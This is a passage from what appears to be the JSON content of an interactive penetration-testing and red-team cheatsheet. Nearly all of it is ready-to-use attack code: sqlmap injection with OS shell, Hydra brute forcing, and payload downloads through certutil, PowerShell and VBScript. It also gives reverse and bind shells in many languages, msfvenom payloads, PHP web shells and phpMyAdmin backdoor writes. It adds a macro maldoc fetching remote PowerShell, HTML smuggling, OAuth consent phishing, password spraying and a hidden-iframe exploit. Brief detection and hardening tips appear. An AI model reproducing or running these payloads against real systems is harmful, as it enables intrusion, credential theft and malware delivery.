            {
              "type": "h3",
              "text": "Test All (Default Settings)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "sqlmap -u \"http://192.168.0.1/database/inject.php?q=user\" --batch"
            },
            {
              "type": "h4",
              "text": "Test All (Default Settings, High Stress)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "sqlmap -u \"http://192.168.0.1/database/inject.php?q=user\" --batch --level=5 --risk=3"
            },
            {
              "type": "h3",
              "text": "Post Request (Capture with BURP)"
            },
            {
              "type": "h4",
              "text": "Test All (Default Settings)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "sqlmap --all -r post_request.txt --batch "
            },
            {
              "type": "h4",
              "text": "Test All (Default Settings, High Stress)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "sqlmap --all -r post_request.txt --batch --level=5 --risk=3"
            },
            {
              "type": "h4",
              "text": "Get A Reverse Shell (MySQL)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "sqlmap -r post_request.txt --dbms \"mysql\" --os-shell"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h1",
              "text": "Brute Force"
            },
            {
              "type": "h2",
              "text": "Hydra"
            },
            {
              "type": "h3",
              "text": "HTTP Basic Authentication"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "hydra -l admin -V -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.0.1 http-get /phpmyadmin/ -t 15"
            },
            {
              "type": "h3",
              "text": "HTTP Get Request"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "hydra 192.168.0.1 -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form \"/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid\" -t 15"
            },
            {
              "type": "h3",
              "text": "HTTP Post Request"
            },
            {
              "type": "p",
              "parts": [
                "Check request in BURP to see Post parameters. **-l or -L has to be set, even if there is no user to login with!**. Use `https-post-form` instead of `http-post-form` for HTTPS sites."
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.1 http-post-form \"/webapp/login.php:username=^USER^&password=^PASS^:Invalid\" -t 15"
            },
            {
              "type": "h3",
              "text": "MYSQL"
            },
            {
              "type": "p",
              "parts": [
                "*Change MYDATABASENAME. Default databasename is mysql.*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -vv  mysql://192.168.0.1:3306/MYDATABASENAME -t 15"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h1",
              "text": "File Transfer"
            },
            {
              "type": "h2",
              "text": "Powershell"
            },
            {
              "type": "h3",
              "text": "As Cmd.exe Command"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "powershell -ExecutionPolicy bypass -noprofile -c (New-Object System.Net.WebClient).DownloadFile('http://192.168.0.1:80/winprivesc/JuicyPotato.exe','C:\\Users\\john\\Desktop\\juicy.exe')"
            },
            {
              "type": "h3",
              "text": "Encode Command for Transfer"
            },
            {
              "type": "p",
              "parts": [
                "*Very helpful for chars that need to be escaped otherwise.*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "$Command = '(new-object System.Net.WebClient).DownloadFile(\"http://192.168.0.1:80/ftp.txt\",\"C:\\Windows\\temp\\ftp.txt\")' \n$Encoded = [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command)) \npowershell.exe -NoProfile -encoded $Encoded"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Certutil"
            },
            {
              "type": "h3",
              "text": "Download"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\\Windows\\Temp\\shell.exe"
            },
            {
              "type": "h3",
              "text": "Download & Execute Python Command"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "os.execute('cmd.exe /c certutil.exe -urlcache -split -f http://192.168.0.1/shell.exe C:\\Windows\\Temp\\shell.exe & C:\\Windows\\Temp\\shell.exe')"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "SMB"
            },
            {
              "type": "h3",
              "text": "Start Impacket SMB Server (With SMB2 Support)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "impacket-smbserver -smb2support server_name /var/www/html"
            },
            {
              "type": "h3",
              "text": "List Drives (Execute on Victim)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "net view \\\\192.168.0.1"
            },
            {
              "type": "h3",
              "text": "Copy Files (Execute on Victim)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "copy \\\\192.168.0.1\\server_name\\shell.exe shell.exe"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "PureFTP"
            },
            {
              "type": "h3",
              "text": "Install"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "apt-get update && apt-get install pure-ftpd"
            },
            {
              "type": "h3",
              "text": "Create setupftp.sh Execute The Script"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "#!/bin/bash\ngroupadd ftpgroup\nuseradd -g ftpgroup -d /dev/null -s /etc ftpuser\npure-pw useradd myftpuser -u ftpuser -d /ftphome\npure-pw mkdb\ncd /etc/pure-ftpd/auth/\nsudo ln -s /etc/pure-ftpd/conf/PureDB /etc/pure-ftpd/auth/40PureDBexit\nmkdir -p /ftphome\nchown -R ftpuser:ftpgroup /ftphome/\n/etc/init.d/pure-ftpd restart"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "./setupftp.sh"
            },
            {
              "type": "h3",
              "text": "Get Service Ready"
            },
            {
              "type": "h4",
              "text": "Reset Password"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "pure-pw passwd offsec -f /etc/pure-ftpd/pureftpd.passwd"
            },
            {
              "type": "p",
              "parts": [
                "#### Commit Changes\n ```bash\npure-pw mkdb\n ```"
              ]
            },
            {
              "type": "p",
              "parts": [
                "#### Restart Service\n ```bash\n/etc/init.d/pure-ftpd restart \n ```"
              ]
            },
            {
              "type": "p",
              "parts": [
                "### Create FTP Script (On Victim)\n ```bash\necho open 192.168.0.1>> ftp.txt\necho USER myftpuser>> ftp.txt\necho mypassword>> ftp.txt\necho bin>> ftp.txt\necho put secret_data.txt>> ftp.txt\necho bye >> ftp.txt\n ```"
              ]
            },
            {
              "type": "h3",
              "text": "Exectue Script (on Victim)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "ftp -v -n -s:ftp.txt"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Netcat"
            },
            {
              "type": "h2",
              "text": "Receiving Shell"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc -l -p 1234 > out.file"
            },
            {
              "type": "h2",
              "text": "Sending Shell"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc -w 3 192.168.0.1 1234 < out.file"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "TFTP"
            },
            {
              "type": "h3",
              "text": "Start TFTP Daemon (Folder /var/tftp)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "atftpd --daemon --port 69 /var/tftp"
            },
            {
              "type": "h3",
              "text": "Transfer Files"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "tftp -i 192.168.0.1 GET whoami.exe"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "VBScript"
            },
            {
              "type": "h3",
              "text": "Create wget.vbs File"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "echo strUrl = WScript.Arguments.Item(0) > wget.vbs\necho StrFile = WScript.Arguments.Item(1) >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs\necho Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs\necho Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs\necho Err.Clear >> wget.vbs\necho Set http = Nothing >> wget.vbs\necho Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs\necho If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs\necho http.Open \"GET\",strURL,False >> wget.vbs\necho http.Send >> wget.vbs\necho varByteArray = http.ResponseBody >> wget.vbs\necho Set http = Nothing >> wget.vbs\necho Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs\necho Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs\necho strData = \"\" >> wget.vbs\necho strBuffer = \"\" >> wget.vbs\necho For lngCounter = 0 to UBound(varByteArray) >> wget.vbs\necho ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs\necho Next >> wget.vbs\necho ts.Close >> wget.vbs"
            },
            {
              "type": "h3",
              "text": "Download Files"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "cscript wget.vbs http://192.168.0.1/nc.exe nc.exe"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h1",
              "text": "Shells"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Upgrade Your Shell (TTY Shell)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "python -c 'import pty;pty.spawn(\"/bin/bash\");' "
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Enable Tab-Completion"
            },
            {
              "type": "ol",
              "items": [
                "In your active shell press `bg` to send your nc session to background",
                "Enter `stty raw -echo`",
                "Enter `fg` to bring your nc session to foreground",
                "Enter `export TERM=xterm-256color`"
              ]
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Catching Reverse Shells (Netcat)"
            },
            {
              "type": "p",
              "parts": [
                "*rlwrap enables the usage of arrow keys in your shell.*\nhttps://github.com/hanslub42/rlwrap"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "rlwrap nc -nlvp 4444"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Netcat"
            },
            {
              "type": "h3",
              "text": "Reverse Shell"
            },
            {
              "type": "h4",
              "text": "Unix"
            },
            {
              "type": "p",
              "parts": [
                "*Victim:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc 192.168.0.1 4444 -e /bin/bash"
            },
            {
              "type": "p",
              "parts": [
                "*If `-e` is not allowed, try to find other versions of netcat*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "/bin/nc\n/usr/bin/ncat\n/bin/netcat\n/bin/nc.traditional"
            },
            {
              "type": "p",
              "parts": [
                "*Attacker:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "rlwrap nc -nlvp 4444"
            },
            {
              "type": "h4",
              "text": "Windows"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc 192.168.0.1 4444 -e cmd.exe"
            },
            {
              "type": "h3",
              "text": "Bind shell"
            },
            {
              "type": "h4",
              "text": "Unix"
            },
            {
              "type": "p",
              "parts": [
                "*Victim:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc -nlvp 4444 -e /bin/bash"
            },
            {
              "type": "p",
              "parts": [
                "*Attacker:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc 192.168.0.1 4444"
            },
            {
              "type": "h4",
              "text": "Windows"
            },
            {
              "type": "p",
              "parts": [
                "*Victim:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc -nlvp 4444 -e cmd.exe"
            },
            {
              "type": "p",
              "parts": [
                "*Attacker:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "nc 192.168.0.1 4444"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Bash"
            },
            {
              "type": "h3",
              "text": "Reverse Shell"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "/bin/bash -i >& /dev/tcp/192.168.0.1/4433 0>&1"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Python"
            },
            {
              "type": "h3",
              "text": "As Command (Reverse Shell)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.0.1\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
            },
            {
              "type": "h3",
              "text": "Python Code (Reverse Shell)"
            },
            {
              "type": "code",
              "language": "python",
              "text": "import socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"192.168.0.1\",4444));os.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\np=subprocess.call([\"/bin/sh\",\"-i\"])"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "PHP"
            },
            {
              "type": "h3",
              "text": "Kali Default PHP Reverse Shell"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "cat /usr/share/webshells/php/php-reverse-shell.php"
            },
            {
              "type": "h3",
              "text": "Kali Default PHP CMD Shell"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "cat /usr/share/webshells/php/php-backdoor.php"
            },
            {
              "type": "h3",
              "text": "PHP Reverse Shell"
            },
            {
              "type": "p",
              "parts": [
                "*Version 1:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "<?php echo shell_exec(\"/bin/bash -i >& /dev/tcp/192.168.0.1/4444 0>&1\");?>"
            },
            {
              "type": "p",
              "parts": [
                "*Version 2:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "<?php $sock=fsockopen(\"192.168.0.1\", 4444);exec(\"/bin/sh -i <&3 >&3 2 >& 3\");?>"
            },
            {
              "type": "p",
              "parts": [
                "*As Command:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "php -r '$sock=fsockopen(\"192.168.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
            },
            {
              "type": "h3",
              "text": "CMD Shell"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "<?php echo system($_REQUEST[\"cmd\"]); ?>"
            },
            {
              "type": "p",
              "parts": [
                "*Call the CMD shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "http://192.168.0.1/cmd_shell.php?cmd=whoami"
            },
            {
              "type": "h3",
              "text": "WhiteWinterWolf Webshell"
            },
            {
              "type": "p",
              "parts": [
                "https://github.com/WhiteWinterWolf/wwwolf-php-webshell"
              ]
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "MSFVENOM"
            },
            {
              "type": "h3",
              "text": "Windows Binary (.exe)"
            },
            {
              "type": "h4",
              "text": "32 Bit (x86)"
            },
            {
              "type": "p",
              "parts": [
                "*Reverse Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe"
            },
            {
              "type": "p",
              "parts": [
                "*Bind Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe"
            },
            {
              "type": "p",
              "parts": [
                "*Output in Hex, C Style, Exclude bad chars, Exitfunction thread:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f c -a x86 --platform windows"
            },
            {
              "type": "h4",
              "text": "64 Bit (x64)"
            },
            {
              "type": "p",
              "parts": [
                "*Reverse Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe"
            },
            {
              "type": "p",
              "parts": [
                "*Bind Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe"
            },
            {
              "type": "p",
              "parts": [
                "*Meterpreter:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe"
            },
            {
              "type": "h3",
              "text": "Linux Binary (.elf)"
            },
            {
              "type": "h4",
              "text": "32 Bit (x86)"
            },
            {
              "type": "p",
              "parts": [
                "*Reverse Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf"
            },
            {
              "type": "p",
              "parts": [
                "*Bind Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf"
            },
            {
              "type": "h4",
              "text": "64 Bit (x64)"
            },
            {
              "type": "p",
              "parts": [
                "*Reverse Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf"
            },
            {
              "type": "p",
              "parts": [
                "*Bind Shell:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf"
            },
            {
              "type": "h3",
              "text": "Java Server Pages (.jsp)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp"
            },
            {
              "type": "p",
              "parts": [
                "*As .war:*"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war"
            },
            {
              "type": "h3",
              "text": "Active Sever Pages Extended (.aspx)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Active Sever Pages Extended (.aspx)"
            },
            {
              "type": "h3",
              "text": "Transfer A File (Certutil)"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "<% \nSet rs = CreateObject(\"WScript.Shell\")\nSet cmd = rs.Exec(\"cmd /c certutil.exe -urlcache -f http://192.168.0.1/shell.exe C:\\Windows\\Temp\\shell.exe\")\no = cmd.StdOut.Readall()\nResponse.write(o)\n%>"
            },
            {
              "type": "h3",
              "text": "Execute a File"
            },
            {
              "type": "code",
              "language": "bash",
              "text": "<% \nSet rs = CreateObject(\"WScript.Shell\")\nSet cmd = rs.Exec(\"cmd /c C:\\Windows\\Temp\\shell.exe\")\no = cmd.StdOut.Readall()\nResponse.write(o)\n%>"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Jenkins / Groovy (Java)"
            },
            {
              "type": "h3",
              "text": "Linux Reverse Shell"
            },
            {
              "type": "code",
              "language": "Java",
              "text": "String host=\"192.168.0.1\";\nint port=4444;\nString cmd=\"/bin/sh\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
            },
            {
              "type": "h3",
              "text": "Windows Reverse Shell"
            },
            {
              "type": "code",
              "language": "Java",
              "text": "String host=\"192.168.0.1\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "Perl"
            },
            {
              "type": "h3",
              "text": "Reverse Shell"
            },
            {
              "type": "code",
              "language": "perl",
              "text": "perl -MIO -e 'use Socket;$ip=\"192.168.0.1\";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            },
            {
              "type": "h2",
              "text": "PhpmyAdmin"
            },
            {
              "type": "p",
              "parts": [
                "Write a CMD shell into a file with the right permissions. Issue the following select.\n(Try different paths for different webservers)"
              ]
            },
            {
              "type": "p",
              "parts": [
                "*Windows:*"
              ]
            },
            {
              "type": "code",
              "language": "sql",
              "text": "SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\backdoor.php\""
            },
            {
              "type": "p",
              "parts": [
                "*Unix:*"
              ]
            },
            {
              "type": "code",
              "language": "sql",
              "text": "SELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"/var/www/html/shell.php\""
            },
            {
              "type": "p",
              "parts": [
                "***"
              ]
            }
          ]
        }
      ]
    },
    "red": {
      "title": "Redteam Interactive Guide",
      "topics": [
        {
          "id": "toc",
          "title": "Welcome to Redteam",
          "content": [
            {
              "type": "p",
              "parts": [
                "Complete ",
                "**Penetration Testing**",
                " & ",
                "**Red Team Cheatsheet**"
              ]
            },
            {
              "type": "ol",
              "items": [
                {
                  "parts": [
                    "🛬 ",
                    "**Initial Access**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "1.1 ",
                "**Phishing**",
                " (Spear, Maldoc)\nWhat it is and Why it Matters: ",
                "**Social engineering attacks**",
                " using email to deliver ",
                "**malicious content**",
                ". It is the most common ",
                "**initial access vector**",
                ", bypassing ",
                "**technical controls**",
                " by targeting ",
                "**humans**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Malicious Word Macro (Maldoc)**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "vba",
              "text": "' Create .docm file with VBA macro\nSub AutoOpen()\n    Dim str As String\n    str = \"powershell -w hidden -nop -c IEX((New-Object Net.WebClient).DownloadString('http://10.10.14.20/shell.ps1'))\"\n    Shell str, vbHide\nEnd Sub\n\n' Alternative for different Office versions\nSub Document_Open()\n    AutoOpen\nEnd Sub\n\nSub Workbook_Open()\n    AutoOpen\nEnd Sub"
            },
            {
              "type": "p",
              "parts": [
                "**HTML Smuggling**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "html",
              "text": "<script>\nconst blob = new Blob([atob(\"BASE64_PAYLOAD\")], { type: 'application/octet-stream' });\nconst url = URL.createObjectURL(blob);\nconst a = document.createElement(\"a\");\na.href = url;\na.download = \"Invoice.pdf.exe\";\ndocument.body.appendChild(a);\na.click();\ndocument.body.removeChild(a);\n</script>"
            },
            {
              "type": "p",
              "parts": [
                "**Consent Phishing (OAuth Abuse)**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Register malicious Azure app with high permissions\n# Craft authorization URL:\nhttps://login.microsoftonline.com/common/oauth2/v2.0/authorize?\nclient_id=MALICIOUS_APP_ID&\nresponse_type=code&\nredirect_uri=https://attacker.com/callback&\nscope=Mail.Read+Files.Read.All+offline_access"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: User executes ",
                "**macro**",
                "/clicks link, leading to ",
                "**shell access**",
                ". Success depends on ",
                "**social engineering**",
                " and ",
                "**security controls**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "Block ",
                    "**macros from internet files**",
                    " via ",
                    "**GPO**"
                  ]
                },
                {
                  "parts": [
                    "Monitor ",
                    {
                      "type": "inline_code",
                      "text": "winword.exe"
                    },
                    " → ",
                    {
                      "type": "inline_code",
                      "text": "powershell.exe"
                    },
                    " ",
                    "**process chains**"
                  ]
                },
                {
                  "parts": [
                    "**Email filtering**",
                    " for malicious attachments"
                  ]
                },
                {
                  "parts": [
                    "User ",
                    "**security awareness training**"
                  ]
                },
                {
                  "parts": [
                    "**Application whitelisting**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**GoPhish**",
                ", ",
                "**King Phisher**",
                ", ",
                "**SET**",
                ", ",
                "**MSFVenom**",
                ", ",
                "**Evilginx2**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Use ",
                "**realistic lures**",
                ", ",
                "**obfuscate macros**",
                ", test against ",
                "**email security controls**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "1.2 ",
                "**Valid Accounts**",
                "\nWhat it is and Why it Matters: Using ",
                "**legitimate credentials**",
                " to access systems. Often obtained through ",
                "**password spraying**",
                ", ",
                "**breach dumps**",
                ", or ",
                "**weak default credentials**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Password Spraying**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# CrackMapExec for SMB spraying\ncrackmapexec smb 10.10.10.0/24 -u users.txt -p 'Spring2024!' --no-bruteforce\n\n# Domain password spray with PowerView\nInvoke-DomainPasswordSpray -UserList users.txt -Password 'Spring2024!' -Domain corp.local\n\n# Kerberos pre-auth spraying\nGetNPUsers.py -no-pass -usersfile users.txt -dc-ip 10.10.10.2 corp.local/"
            },
            {
              "type": "p",
              "parts": [
                "**Credential Stuffing**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Use breach-compromised credentials\ncrackmapexec smb 10.10.10.0/24 -u breached_users.txt -p breached_passwords.txt\n\n# With known valid domain\ncrackmapexec smb 10.10.10.0/24 -u user -p password -d corp.local"
            },
            {
              "type": "p",
              "parts": [
                "**Default Credentials**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Common default credentials\n# admin:admin, administrator:password, guest:guest\ncrackmapexec smb 10.10.10.0/24 -u default_users.txt -p default_passwords.txt"
            },
            {
              "type": "p",
              "parts": [
                "What to Expect: Valid ",
                "**domain**",
                " or ",
                "**local account access**",
                ". May trigger ",
                "**account lockout policies**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Detection / Hardening:"
              ]
            },
            {
              "type": "ul",
              "items": [
                {
                  "parts": [
                    "**Account lockout policies**",
                    " (5-10 attempts)"
                  ]
                },
                {
                  "parts": [
                    "**Multi-Factor Authentication (MFA)**"
                  ]
                },
                {
                  "parts": [
                    "**Impossible travel detection**"
                  ]
                },
                {
                  "parts": [
                    "**Login time restrictions**"
                  ]
                },
                {
                  "parts": [
                    "**Regular password rotation**"
                  ]
                }
              ]
            },
            {
              "type": "p",
              "parts": [
                "Tools / References: ",
                "**CrackMapExec**",
                ", ",
                "**Hydra**",
                ", ",
                "**Metasploit**",
                ", ",
                "**PowerView**"
              ]
            },
            {
              "type": "p",
              "parts": [
                "OPSEC / Notes: Avoid ",
                "**account lockouts**",
                ", use ",
                "**low-and-slow approaches**",
                ", research target ",
                "**password policies**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "1.3 ",
                "**Drive-by Compromise**",
                "\nWhat it is and Why it Matters: Compromising users when they visit ",
                "**malicious websites**",
                " that exploit ",
                "**browser vulnerabilities**",
                " or ",
                "**social engineering**",
                "."
              ]
            },
            {
              "type": "p",
              "parts": [
                "Quick Steps / Commands:"
              ]
            },
            {
              "type": "p",
              "parts": [
                "**Browser Exploit Delivery**",
                ":"
              ]
            },
            {
              "type": "code",
              "language": "bash",
              "text": "# Metasploit browser exploit\nuse exploit/multi/browser/java_jre17_driver_manager\nset payload windows/meterpreter/reverse_https\nset LHOST 10.10.14.20\nset LPORT 443\nexploit\n\n# Generate malicious iframe\n<iframe src=\"http://10.10.14.20:8080/exploit\" width=\"0\" height=\"0\" style=\"border:0; display:none;\"></iframe>"
            },
            {
              "type": "p",
              "parts": [
                "**Fake Updates**",
                ":"
              ]
            },
            {
              "type": "code",
